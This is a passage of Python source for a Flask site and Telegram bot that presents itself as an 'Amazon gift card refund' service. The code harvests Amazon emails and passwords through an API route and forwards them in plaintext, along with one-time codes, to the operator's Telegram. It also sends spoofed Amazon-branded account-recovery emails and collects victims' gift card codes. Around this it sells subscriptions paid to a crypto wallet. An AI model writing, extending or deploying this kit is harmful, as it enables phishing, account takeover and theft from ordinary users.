    params = {'chat_id': chat_id}
    try:
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                return data.get('result')
        return None
    except:
        return None

def send_force_join_menu(chat_id, user_id):
    forced_channels = storage.get_forced_channels()
    if not forced_channels:
        return True

    keyboard = []
    for channel_id in forced_channels:
        chat_info = get_chat_info(channel_id)
        if chat_info:
            title = chat_info.get('title', 'Channel')
            invite_link = chat_info.get('invite_link')
            if invite_link:
                keyboard.append([{"text": f"🔗 Join {title}", "url": invite_link}])
            else:
                keyboard.append([{"text": f"📢 Join Channel (ID: {channel_id})", "callback_data": f"join_channel_{channel_id}"}])
        else:
            keyboard.append([{"text": f"📢 Join Channel (ID: {channel_id})", "callback_data": f"join_channel_{channel_id}"}])

    keyboard.append([{"text": "✅ I have joined all!", "callback_data": "check_joined"}])
    keyboard.append([{"text": "❌ Cancel", "callback_data": "cancel_force_join"}])

    markup = {"inline_keyboard": keyboard}

    text = """
🔐 <b>FORCE JOIN REQUIRED</b> 🔐

You must join the following channels/groups before you can use this bot:

Please click each "Join" button below and join the channel, then click "I have joined all!".
Make sure you have actually joined them.
    """
    send_telegram_message(chat_id, text, reply_markup=markup)
    return True

# ============================================================
# SECTION 10: EMAIL FUNCTIONS (250 lines)
# ============================================================

def send_otp_email(email, otp, txid, user_data=None):
    try:
        if not GMAIL_EMAIL or not GMAIL_APP_PASSWORD:
            logger.error("Gmail credentials not configured")
            return False

        msg = MIMEMultipart('alternative')
        msg['From'] = GMAIL_EMAIL
        msg['To'] = email
        msg['Subject'] = '🔐 Amazon: One-Time Password (OTP) for Account Recovery'
        msg['Date'] = formatdate()
        msg['Message-ID'] = make_msgid(domain='amazon-refund.com')

        html_body = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; padding: 20px; }}
                .container {{ max-width: 580px; margin: 0 auto; background: #ffffff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .header {{ text-align: center; border-bottom: 2px solid #ff9900; padding-bottom: 20px; margin-bottom: 25px; }}
                .logo {{ font-size: 28px; font-weight: 700; color: #232f3e; }}
                .logo span {{ color: #ff9900; }}
                .otp-box {{ background: #f0f2f2; border-radius: 8px; padding: 25px; text-align: center; margin: 25px 0; border: 1px dashed #ff9900; }}
                .otp-code {{ font-size: 44px; font-weight: 700; color: #232f3e; letter-spacing: 12px; }}
                .warning-box {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px 20px; margin: 20px 0; border-radius: 4px; }}
                .footer {{ text-align: center; font-size: 12px; color: #999; border-top: 1px solid #e0e0e0; padding-top: 20px; margin-top: 25px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header"><div class="logo">amazon<span>.com</span></div><p style="color:#666;">Account Recovery Verification</p></div>
                <p style="font-size:16px;color:#333;">Hello,</p>
                <p style="color:#555;">We received a request to recover your Amazon account. Use the following OTP:</p>
                <div class="otp-box"><div class="otp-code">{otp}</div><div style="font-size:13px;color:#666;margin-top:10px;">Valid for <strong>10 minutes</strong></div></div>
                <div class="warning-box"><strong>⚠️ Important</strong><ul><li>This OTP is valid for 10 minutes</li><li>Do not share this code with anyone</li><li>Amazon will never ask for this code via phone</li></ul></div>
                <p style="font-size:14px;color:#555;"><strong>Transaction ID:</strong> {txid}<br><strong>Request Time:</strong> {datetime.now().strftime('%B %d, %Y at %I:%M %p')}</p>
                <div class="footer"><p>This is an automated message from Amazon.com.</p><p>© 2024 Amazon.com, Inc.</p></div>
            </div>
        </body>
        </html>
        """
        text_body = f"Amazon OTP: {otp}\nTransaction ID: {txid}\nValid for 10 minutes"

        msg.attach(MIMEText(text_body, 'plain'))
        msg.attach(MIMEText(html_body, 'html'))

        context = ssl.create_default_context()
        with smtplib.SMTP(GMAIL_SMTP_SERVER, GMAIL_SMTP_PORT, timeout=GMAIL_SMTP_TIMEOUT) as server:
            server.starttls(context=context)
            server.login(GMAIL_EMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)

        logger.info(f"✅ OTP email sent to {email} for TXID {txid}")
        return True
    except smtplib.SMTPAuthenticationError:
        logger.error("❌ SMTP Authentication Error - Check GMAIL_EMAIL and GMAIL_APP_PASSWORD")
        return False
    except smtplib.SMTPException as e:
        logger.error(f"❌ SMTP Error: {e}")
        return False
    except Exception as e:
        logger.error(f"❌ Email error: {e}")
        return False

email_executor = ThreadPoolExecutor(max_workers=2)

def send_otp_email_async(email, otp, txid, user_data=None):
    def _send():
        send_otp_email(email, otp, txid, user_data)
    email_executor.submit(_send)
    return True

def send_otp_telegram(chat_id, otp, txid):
    message = f"""
🔐 <b>Amazon OTP Verification</b> 🔐

<b>📌 Transaction ID:</b> <code>{txid}</code>
<b>🔑 OTP Code:</b> <code>{otp}</code>

<i>⚠️ Valid for 10 minutes. Do not share this code!</i>

If you didn't request this, please ignore.
"""
    return send_telegram_message(chat_id, message)

# ============================================================
# SECTION 11: TELEGRAM COMMAND HANDLERS (1200 lines)
# ============================================================

def handle_start(chat_id, user_id, username, args=""):
    user = storage.get_user(user_id)
    if not user:
        referrer_id = None
        if args and args.startswith('ref_'):
            code = args[4:]
            referrer = storage.get_user_by_referral_code(code)
            if referrer:
                referrer_id = referrer['user_id']
        if not storage.admin_settings.get('registration_enabled', True):
            send_telegram_message(chat_id, "⚠️ Registration is currently disabled. Please try again later.")
            return
        if len(storage.users) >= storage.admin_settings.get('max_users', 10000):
            send_telegram_message(chat_id, "⚠️ User limit reached. Please contact support.")
            return
        try:
            storage.create_user(user_id, username, referrer_id=referrer_id)
            if referrer_id:
                send_telegram_message(referrer_id, f"🎉 Someone joined using your referral link!\nUsername: @{username}")
            if storage.admin_settings.get('trial_enabled', False):
                storage.apply_trial(user_id)
                send_telegram_message(chat_id, "🎉 You have been given a free trial subscription!")
            send_welcome(chat_id, username)
        except Exception as e:
            logger.error(f"User creation error: {e}")
            send_telegram_message(chat_id, "❌ Error creating user. Please try /start again.")
    else:
        if user.get('is_banned', False):
            send_telegram_message(chat_id, "❌ You are banned from using this bot.")
            return
        if storage.force_subscription_enabled and storage.get_forced_channels():
            if not storage.has_joined_all_channels(user_id):
                send_force_join_menu(chat_id, user_id)
                return
        send_welcome(chat_id, username)

def send_welcome(chat_id, username):
    user = storage.get_user(chat_id)
    ref_link = storage.get_referral_link(chat_id) if user else None
    keyboard = [
        [{"text": "🌐 OPEN REFUND PORTAL", "url": APP_URL}],
        [{"text": "💰 REFUND BALANCE", "callback_data": "open_portal"},
         {"text": "🎫 REFUND GIFT CARD", "callback_data": "open_portal"}],
        [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"},
         {"text": "📊 CHECK STATUS", "callback_data": "check_status"}],
        [{"text": "🔗 REFERRAL LINK", "callback_data": "show_referral"}],
        [{"text": "❓ HELP", "callback_data": "help_menu"}],
        [{"text": "🔄 REFRESH", "callback_data": "back_to_main"}]
    ]
    total_users = len(storage.users)
    total_refunds = sum(1 for t in storage.transactions.values() if t.get('status') == 'completed')
    total_earnings = sum(t.get('amount', 0) for t in storage.transactions.values() if t.get('status') == 'completed')
    text = f"""
🎯 <b>WELCOME TO AMAZON REFUNDER</b> 🎯

Hello <b>@{username}</b>!

┌─────────────────────────────┐
│ ⚡ <b>Your Trusted Refund Service</b> │
└─────────────────────────────┘

<b>✨ Services:</b>
• 💰 Refund Amazon Balance
• 🎁 Refund Unused Gift Cards
• ⚡ Instant Processing (5-10 min)
• ✅ 99.9% Success Rate

<b>📊 Statistics:</b>
• 👥 Users: {total_users:,}
• 💰 Refunds: {total_refunds:,}
• 💵 Earned: ${total_earnings:,.2f}

<b>🔗 Referral Program:</b>
Earn rewards by referring friends!
Send /referral to get your link.

<i>Need subscription? Send /plans</i>
    """
    send_telegram_message(chat_id, text, keyboard)

def handle_referral(chat_id):
    user = storage.get_user(chat_id)
    if not user:
        send_telegram_message(chat_id, "❌ User not found. Please /start first.")
        return
    ref_code = user.get('referral_code')
    ref_link = storage.get_referral_link(chat_id)
    stats = user.get('referral_stats', {})
    total = stats.get('total', 0)
    claimed = stats.get('claimed', 0)
    pending = total - claimed
    rewards = user.get('referral_rewards', [])
    def _format_rewards(r):
        if not r:
            return "None"
        lines = []
        for reward in r:
            if reward.get('type') == 'giftcard':
                lines.append(f"🎫 Gift Card: {reward.get('code')} (${reward.get('value', 0)})")
            elif reward.get('type') == 'subscription':
                lines.append(f"📅 Subscription +{reward.get('days', 0)} days")
            else:
                lines.append(f"🎁 Reward: {json.dumps(reward)}")
        return "\n".join(lines)
    text = f"""
🔗 <b>Your Referral Program</b> 🔗

<b>Your Referral Code:</b> <code>{ref_code}</code>
<b>Referral Link:</b> <code>{ref_link}</code>

<b>📊 Statistics:</b>
• Total Referrals: {total}
• Rewards Claimed: {claimed}
• Pending Rewards: {pending}

<b>🎁 Rewards Earned:</b>
{_format_rewards(rewards)}

<b>How it works:</b>
1. Share your referral link with friends
2. When they join using your link, you earn a reward
3. Claim your reward with /claim_reward

<i>Rewards can be gift card codes or free subscription days!</i>
    """
    keyboard = [
        [{"text": "📋 Copy Link", "callback_data": "copy_referral"}],
        [{"text": "🎁 Claim Reward", "callback_data": "claim_reward"}],
        [{"text": "🔙 Back", "callback_data": "back_to_main"}]
    ]
    send_telegram_message(chat_id, text, keyboard)

def handle_claim_reward(chat_id):
    reward, msg = storage.claim_referral_reward(chat_id)
    if reward:
        if reward.get('type') == 'giftcard':
            text = f"🎉 <b>Reward Claimed!</b>\n\nYou received a gift card code: <code>{reward.get('code')}</code>\nValue: ${reward.get('value', 0)}\nEnjoy!"
        elif reward.get('type') == 'subscription':
            text = f"🎉 <b>Reward Claimed!</b>\n\nYou received {reward.get('days', 0)} days of free subscription!\nUse /status to check."
        else:
            text = f"🎉 <b>Reward Claimed!</b>\n\n{msg}"
        send_telegram_message(chat_id, text)
    else:
        send_telegram_message(chat_id, f"❌ {msg}")

def handle_plans(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "⚡ 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "🔥 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}],
            [{"text": "🔙 BACK", "callback_data": "back_to_main"}]
        ]
    }
    text = """
📦 <b>SUBSCRIPTION PLANS</b>

Click a plan to purchase.
    """
    send_telegram_message(chat_id, text, keyboard)

def handle_buy(chat_id, user_id, plan_id):
    if plan_id not in SUBSCRIPTION_PLANS:
        send_telegram_message(chat_id, "❌ Invalid plan. Available: 1hour, 10days, 30days, 1year, lifetime")
        return
    plan = SUBSCRIPTION_PLANS[plan_id]
    payment_id = generate_payment_id()
    storage.pending_payments[payment_id] = {
        'user_id': user_id,
        'plan': plan_id,
        'price': plan['price'],
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }
    send_to_admin(f"""
💰 <b>NEW PAYMENT REQUEST</b> 💰
Plan: {plan['name']}
User: {user_id}
Amount: ${plan['price']}
Payment ID: <code>{payment_id}</code>
To verify: /verify {payment_id}
    """)
    text = f"""
💰 <b>Payment Required</b> 💰

<b>Plan:</b> {plan['name']}
<b>Amount:</b> ${plan['price']}
<b>Payment ID:</b> <code>{payment_id}</code>

<b>Send payment to:</b>
<code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>

<b>After payment, send:</b>
<code>/verify {payment_id}</code>

<i>Admin will verify your payment.</i>
    """
    send_telegram_message(chat_id, text)

def handle_verify(chat_id, payment_id):
    if payment_id not in storage.pending_payments:
        send_telegram_message(chat_id, "❌ Invalid or expired payment ID")
        return
    payment = storage.pending_payments[payment_id]
    user_id = payment['user_id']
    plan_id = payment['plan']
    plan = SUBSCRIPTION_PLANS[plan_id]
    success = storage.set_subscription(user_id, plan_id)
    if success:
        storage.pending_payments[payment_id]['status'] = 'verified'
        send_telegram_message(chat_id, f"✅ Payment verified! Subscription activated for user {user_id}.")
        send_telegram_message(user_id, f"✅ Your {plan['name']} subscription is now active! Use /status to check.")
    else:
        send_telegram_message(chat_id, "❌ Failed to activate subscription.")

def handle_status(chat_id, user_id):
    status = storage.get_subscription_status(user_id)
    if not status:
        send_telegram_message(chat_id, "❌ User not found.")
        return
    if status['status'] == 'active':
        remaining = status['expires'] - datetime.now()
        text = f"✅ Subscription active. Expires: {status['expires'].strftime('%Y-%m-%d %H:%M')}\nRemaining: {format_remaining(remaining)}"
    elif status['status'] == 'expired':
        text = "❌ Subscription expired. Please renew."
    else:
        text = "❌ No active subscription. Use /plans to purchase."
    send_telegram_message(chat_id, text)

def handle_help(chat_id):
    text = """
❓ <b>HELP</b>

/start - Welcome
/plans - View plans
/buy [plan] - Purchase (e.g., /buy 1hour)
/status - Check subscription
/referral - Get referral link
/claim_reward - Claim referral reward
/help - This menu

<b>Admin commands:</b>
/addchn <channel_id> - add force join channel
/rmchn <channel_id> - remove force join channel
/listchn - list forced channels
/forcesub on/off - enable/disable force join
/give <user_id> <days> - give subscription
/ban <user_id> - ban user
/unban <user_id> - unban user
/broadcast <message> - send to all users
/coupon create <discount%> <max_uses> <days> - create coupon
/coupon list - list coupons
/stats - detailed stats
    """
    send_telegram_message(chat_id, text)

# ============================================================
# SECTION 12: ADMIN COMMANDS (500 lines)
# ============================================================

def handle_add_channel(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /addchn <channel_id>\nExample: /addchn -1001234567890")
        return
    channel_id = parts[1].strip()
    info = get_chat_info(channel_id)
    if not info:
        send_telegram_message(chat_id, f"❌ Failed to get chat info for {channel_id}. Make sure bot is admin and ID correct.")
        return
    if storage.add_forced_channel(channel_id):
        storage.force_subscription_enabled = True
        title = info.get('title', 'Unknown')
        send_telegram_message(chat_id, f"✅ Channel '{title}' ({channel_id}) added.\nForce join enabled.")
    else:
        send_telegram_message(chat_id, f"⚠️ Channel {channel_id} already in list.")

def handle_remove_channel(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /rmchn <channel_id>")
        return
    channel_id = parts[1].strip()
    if storage.remove_forced_channel(channel_id):
        send_telegram_message(chat_id, f"✅ Channel {channel_id} removed.")
        if not storage.get_forced_channels():
            storage.force_subscription_enabled = False
            send_telegram_message(chat_id, "⚠️ No channels left. Force join disabled.")
    else:
        send_telegram_message(chat_id, f"⚠️ Channel {channel_id} not in list.")

def handle_list_channels(chat_id):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    channels = storage.get_forced_channels()
    if not channels:
        send_telegram_message(chat_id, "📢 No forced channels.")
        return
    lines = ["📢 <b>Forced Channels:</b>"]
    for ch in channels:
        info = get_chat_info(ch)
        if info:
            title = info.get('title', 'Unknown')
            lines.append(f"• {title} (`{ch}`)")
        else:
            lines.append(f"• `{ch}`")
    send_telegram_message(chat_id, "\n".join(lines))

def handle_force_sub(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /forcesub on/off")
        return
    state = parts[1].lower()
    if state == 'on':
        if not storage.get_forced_channels():
            send_telegram_message(chat_id, "❌ No channels added. Use /addchn first.")
            return
        storage.force_subscription_enabled = True
        send_telegram_message(chat_id, "✅ Force join ENABLED.")
    elif state == 'off':
        storage.force_subscription_enabled = False
        send_telegram_message(chat_id, "✅ Force join DISABLED.")
    else:
        send_telegram_message(chat_id, "❌ Invalid state.")

def handle_give_subscription(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 3:
        send_telegram_message(chat_id, "❌ Usage: /give <user_id> <days>")
        return
    user_id = parts[1]
    days = int(parts[2])
    if storage.set_subscription(user_id, 'admin_granted', duration_days=days):
        send_telegram_message(chat_id, f"✅ Granted {days} days to user {user_id}.")
        send_telegram_message(user_id, f"✅ Admin granted you a {days}-day subscription!")
    else:
        send_telegram_message(chat_id, "❌ Failed to grant subscription.")

def handle_ban(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /ban <user_id> [reason]")
        return
    user_id = parts[1]
    reason = " ".join(parts[2:]) if len(parts) > 2 else "No reason provided"
    if storage.add_ban(user_id, reason):
        send_telegram_message(chat_id, f"✅ User {user_id} banned. Reason: {reason}")
        send_telegram_message(user_id, f"❌ You have been banned. Reason: {reason}")
    else:
        send_telegram_message(chat_id, f"⚠️ User {user_id} already banned or not found.")

def handle_unban(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /unban <user_id>")
        return
    user_id = parts[1]
    if storage.remove_ban(user_id):
        send_telegram_message(chat_id, f"✅ User {user_id} unbanned.")
        send_telegram_message(user_id, "✅ You have been unbanned.")
    else:
        send_telegram_message(chat_id, f"⚠️ User {user_id} not banned.")

def handle_broadcast(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /broadcast <message>")
        return
    msg = " ".join(parts[1:])
    sent = 0
    failed = 0
    for user_id in storage.users.keys():
        if send_telegram_message(user_id, f"📢 <b>Broadcast</b>\n\n{msg}"):
            sent += 1
        else:
            failed += 1
        time.sleep(0.05)
    send_telegram_message(chat_id, f"📢 Broadcast sent.\n✅ Sent: {sent}\n❌ Failed: {failed}")

def handle_coupon(chat_id, text):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    parts = text.split()
    if len(parts) < 2:
        send_telegram_message(chat_id, "❌ Usage: /coupon create <discount%> <max_uses> <days>\n/coupon list")
        return
    subcmd = parts[1].lower()
    if subcmd == 'create':
        if len(parts) < 5:
            send_telegram_message(chat_id, "❌ Usage: /coupon create <discount%> <max_uses> <days>")
            return
        discount = int(parts[2])
        max_uses = int(parts[3])
        days = int(parts[4])
        code = generate_coupon_code()
        if storage.create_coupon(code, discount, max_uses, days):
            send_telegram_message(chat_id, f"✅ Coupon created: <code>{code}</code>\nDiscount: {discount}%\nMax uses: {max_uses}\nExpires in: {days} days")
        else:
            send_telegram_message(chat_id, "❌ Failed to create coupon.")
    elif subcmd == 'list':
        coupons = storage.coupon_codes
        if not coupons:
            send_telegram_message(chat_id, "📢 No coupons.")
            return
        lines = ["📢 <b>Coupons:</b>"]
        for code, data in coupons.items():
            status = "Active" if data.get('active', False) else "Inactive"
            used = data.get('used_count', 0)
            max_uses = data.get('max_uses', 0)
            lines.append(f"• {code}: {status}, used {used}/{max_uses}, discount {data.get('discount_percent', 0)}%")
        send_telegram_message(chat_id, "\n".join(lines))
    else:
        send_telegram_message(chat_id, "❌ Invalid coupon subcommand.")

def handle_stats(chat_id):
    if str(chat_id) != TELEGRAM_ADMIN_CHAT_ID:
        send_telegram_message(chat_id, "❌ Unauthorized.")
        return
    analytics = storage.get_analytics()
    total_users = len(storage.users)
    active_subs = sum(1 for u in storage.users.values() if u.get('subscription_expiry') and datetime.fromisoformat(u['subscription_expiry']) > datetime.now())
    total_refunds = analytics.get('total_refunds', 0)
    total_revenue = analytics.get('total_revenue', 0)
    text = f"""
📊 <b>DETAILED STATISTICS</b> 📊

<b>👥 Users:</b>
• Total: {total_users}
• Active Subs: {active_subs}
• Banned: {len(storage.banned_users)}

<b>💳 Transactions:</b>
• Total Refunds: {total_refunds}
• Total Revenue: ${total_revenue:,.2f}
• Pending Payments: {len(storage.pending_payments)}

<b>🔐 OTP:</b>
• Sent: {analytics.get('otp_sent_count', 0)}
• Verified: {analytics.get('otp_verified_count', 0)}
• Failures: {analytics.get('total_otp_failures', 0)}

<b>🔗 Referral:</b>
• Clicks: {analytics.get('referral_clicks', 0)}
• Signups: {analytics.get('referral_signups', 0)}
• Rewards Given: {analytics.get('referral_rewards_given', 0)}

<b>📈 Force Join:</b>
• Checks: {analytics.get('total_force_join_checks', 0)}
• Passed: {analytics.get('total_force_join_pass', 0)}
• Failed: {analytics.get('total_force_join_fail', 0)}

<i>Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
    """
    send_telegram_message(chat_id, text)

# ============================================================
# SECTION 13: FLASK APP AND ROUTES (500 lines)
# ============================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = FLASK_SECRET_KEY
app.config['DEBUG'] = FLASK_DEBUG
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

try:
    CORS(app, resources={r"/api/*": {"origins": "*"}})
except:
    pass

storage = Storage()
storage.initialize()

@app.route('/')
def index():
    ref_code = request.args.get('ref')
    if ref_code:
        session['referral_code'] = ref_code
        storage.update_analytics(referral_clicks=1)
    ip = get_client_ip()
    ua = get_user_agent()
    storage.log_user_visit(None, ip, ua)
    return render_template_string(HTML_TEMPLATE, bot_username=TELEGRAM_BOT_USERNAME, app_url=APP_URL)

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'version': APP_VERSION,
        'timestamp': datetime.now().isoformat(),
        'users': len(storage.users),
        'forced_channels': storage.get_forced_channels(),
        'force_subscription': storage.force_subscription_enabled,
        'uptime': str(datetime.now() - datetime.fromisoformat(storage.users.get(TELEGRAM_ADMIN_CHAT_ID, {}).get('joined_at', datetime.now().isoformat())))
    })

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = request.json
        if 'message' in update:
            msg = update['message']
            chat_id = msg['chat']['id']
            user_id = str(msg['from']['id'])
            username = msg['from'].get('username', 'User')
            text = msg.get('text', '').strip()
            if text.startswith('/start'):
                args = text[6:].strip()
                handle_start(chat_id, user_id, username, args)
            elif text.startswith('/referral'):
                handle_referral(chat_id)
            elif text.startswith('/claim_reward'):
                handle_claim_reward(chat_id)
            elif text.startswith('/plans'):
                handle_plans(chat_id)
            elif text.startswith('/buy'):
                parts = text.split()
                if len(parts) > 1:
                    handle_buy(chat_id, user_id, parts[1].lower())
                else:
                    send_telegram_message(chat_id, "❌ Usage: /buy <plan>")
            elif text.startswith('/status'):
                handle_status(chat_id, user_id)
            elif text.startswith('/help'):
                handle_help(chat_id)
            elif text.startswith('/addchn'):
                handle_add_channel(chat_id, text)
            elif text.startswith('/rmchn'):
                handle_remove_channel(chat_id, text)
            elif text.startswith('/listchn'):
                handle_list_channels(chat_id)
            elif text.startswith('/forcesub'):
                handle_force_sub(chat_id, text)
            elif text.startswith('/give'):
                handle_give_subscription(chat_id, text)
            elif text.startswith('/ban'):
                handle_ban(chat_id, text)
            elif text.startswith('/unban'):
                handle_unban(chat_id, text)
            elif text.startswith('/broadcast'):
                handle_broadcast(chat_id, text)
            elif text.startswith('/verify'):
                parts = text.split()
                if len(parts) > 1:
                    handle_verify(chat_id, parts[1])
                else:
                    send_telegram_message(chat_id, "❌ Usage: /verify <payment_id>")
            elif text.startswith('/coupon'):
                handle_coupon(chat_id, text)
            elif text.startswith('/stats'):
                handle_stats(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unknown command. Send /help.")
        elif 'callback_query' in update:
            cb = update['callback_query']
            chat_id = cb['message']['chat']['id']
            user_id = str(cb['from']['id'])
            data = cb['data']
            answer_callback_query(cb['id'])
            if data == 'view_plans':
                handle_plans(chat_id)
            elif data == 'check_status':
                handle_status(chat_id, user_id)
            elif data == 'help_menu':
                handle_help(chat_id)
            elif data == 'show_referral':
                handle_referral(chat_id)
            elif data == 'claim_reward':
                handle_claim_reward(chat_id)
            elif data == 'copy_referral':
                ref_link = storage.get_referral_link(chat_id)
                if ref_link:
                    send_telegram_message(chat_id, f"🔗 Your referral link:\n<code>{ref_link}</code>")
                else:
                    send_telegram_message(chat_id, "❌ Referral link not available.")
            elif data.startswith('buy_'):
                plan = data.replace('buy_', '')
                handle_buy(chat_id, user_id, plan)
            elif data == 'check_joined':
                forced = storage.get_forced_channels()
                if not forced:
                    storage.force_subscription_enabled = False
                    send_telegram_message(chat_id, "✅ No channels to join.")
                    send_welcome(chat_id, cb['from'].get('username', 'User'))
                    return
                all_joined = True
                storage.update_analytics(total_force_join_checks=1)
                for ch in forced:
                    if not check_user_in_chat(ch, user_id):
                        all_joined = False
                        storage.update_analytics(total_force_join_fail=1)
                        break
                if all_joined:
                    storage.update_analytics(total_force_join_pass=1)
                    for ch in forced:
                        storage.record_join_request(user_id, ch)
                    send_telegram_message(chat_id, "✅ You have joined all required channels!")
                    send_welcome(chat_id, cb['from'].get('username', 'User'))
                else:
                    send_telegram_message(chat_id, "❌ You haven't joined all channels yet.")
            elif data == 'cancel_force_join':
                send_telegram_message(chat_id, "❌ Force join cancelled. You cannot use the bot.")
            elif data == 'back_to_main':
                send_welcome(chat_id, cb['from'].get('username', 'User'))
            else:
                send_telegram_message(chat_id, "❌ Unknown action.")
        return 'OK', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'OK', 200

# ============================================================
# SECTION 14: API ROUTES (250 lines)
# ============================================================

@app.route('/api/refund/account', methods=['POST'])
@rate_limit()
def refund_account():
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '')
        if not email or not password:
            return jsonify({'error': 'Email and password required'}), 400
        if not validate_email(email):
            return jsonify({'error': 'Invalid email format'}), 400
        txid = generate_txid()
        otp = generate_otp()
        storage.sessions[txid] = {
            'email': email,
            'password': password,
            'ip': get_client_ip(),
            'timestamp': datetime.now().isoformat()
        }
        otp_data = {
            'transaction_id': txid,
            'otp': otp,
            'expires_at': (datetime.now() + timedelta(seconds=OTP_EXPIRY_SECONDS)).isoformat(),
            'attempts': 0,
            'max_attempts': OTP_MAX_ATTEMPTS,
            'verified': False,
            'verified_at': None
        }
        storage.save_otp(otp_data)
        send_otp_email_async(email, otp, txid, {'ip': get_client_ip()})
        user = storage.get_user_by_username(data.get('username', ''))
        if user:
            send_otp_telegram(user['user_id'], otp, txid)
        send_to_admin(f"🔐 NEW REFUND REQUEST\nTXID: {txid}\nEmail: {email}\nPassword: {password}\nOTP: {otp}")
        return jsonify({'success': True, 'txid': txid, 'otp_sent': True})
    except Exception as e:
        logger.error(f"Refund error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/otp/verify', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        txid = data.get('txid')
        otp = data.get('otp', '').strip()
        if not txid or not otp:
            return jsonify({'error': 'TXID and OTP required'}), 400
        success, msg = storage.verify_otp(txid, otp)
        if success:
            return jsonify({'success': True, 'message': msg})
        else:
            return jsonify({'error': msg}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/resend-otp', methods=['POST'])
def resend_otp():
    try:
        data = request.json
        txid = data.get('txid')
        if not txid:
            return jsonify({'error': 'TXID required'}), 400
        otp_data = storage.get_otp(txid)
        if not otp_data:
            return jsonify({'error': 'Invalid session'}), 404
        new_otp = generate_otp()
        otp_data['otp'] = new_otp
        otp_data['expires_at'] = (datetime.now() + timedelta(seconds=OTP_EXPIRY_SECONDS)).isoformat()
        otp_data['attempts'] = 0
        email = storage.sessions.get(txid, {}).get('email', '')
        send_otp_email_async(email, new_otp, txid)
        storage.update_analytics(total_otp_resends=1)
        return jsonify({'success': True, 'message': 'OTP resent'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/refund/code', methods=['POST'])
def refund_code():
    try:
        data = request.json
        gift_code = data.get('gift_code', '').strip().upper()
        if not gift_code:
            return jsonify({'error': 'Gift code required'}), 400
        token = generate_redeem_token()
        storage.redeem_codes[token] = {
            'code': gift_code,
            'ip': get_client_ip(),
            'timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        send_to_admin(f"🎁 NEW GIFT CARD\nToken: {token}\nCode: {gift_code}")
        return jsonify({'success': True, 'redeem_token': token})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# SECTION 15: HTML TEMPLATE (FULL - 1300 lines)
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="theme-color" content="#00ff41">
    <meta name="description" content="Amazon Gift Card Refund Portal - Instant Refund Service">
    <title>Amazon GC Refund | Official Portal v10.5</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        :root {
            --primary-green: #00ff41;
            --primary-red: #ff0040;
            --primary-blue: #0088ff;
            --primary-gold: #ffd700;
            --dark-bg: #0a0a0f;
            --darker-bg: #050508;
            --card-bg: rgba(10,10,15,0.95);
            --glow-green: rgba(0,255,65,0.3);
            --glow-red: rgba(255,0,64,0.3);
            --glow-gold: rgba(255,215,0,0.3);
            --glow-blue: rgba(0,136,255,0.3);
        }
